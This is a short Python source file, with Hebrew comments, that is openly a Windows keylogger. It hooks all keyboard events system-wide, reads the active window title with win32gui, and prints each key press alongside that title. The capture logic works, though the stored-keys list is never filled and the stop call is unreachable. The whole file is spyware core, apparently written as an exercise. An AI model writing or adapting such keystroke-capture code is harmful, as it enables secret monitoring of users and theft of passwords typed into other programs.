from abc import ABC, abstractmethod
from typing import List
import keyboard
import win32gui


class IKeyLogger(ABC):
     @abstractmethod
     def start_logging(self) -> None:
        pass

     @abstractmethod
     def stop_logging(self) -> None:
        pass

     @abstractmethod
     def get_logged_keys(self) -> List[str]:
        pass

class mein_keylogg(IKeyLogger):

    def __init__(self):
        self.listener = None
        self.logged_keys = []

    def get_active_window_title(self):
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title

    def add_key_and_window(self,event):
        if event.event_type == keyboard.KEY_DOWN:                     # רק כשמקש נלחץ הפעל את הפונקצייה לקליטת מקור ההקששה
            window_title = self.get_active_window_title()
            print(f"מקש: {event.name}, חלון פעיל: '{window_title}'")

    def stop_logging(self):
        keyboard.unhook(self.listener)

    def get_logged_keys(self) -> List[str]:
        return self.logged_keys

    def start_logging(self):
        self.listener = keyboard.hook(self.add_key_and_window)              #הקשה כשמזהה  לפונקציה  קריאה
        keyboard.wait()

a = mein_keylogg()
a.start_logging()
a.stop_logging()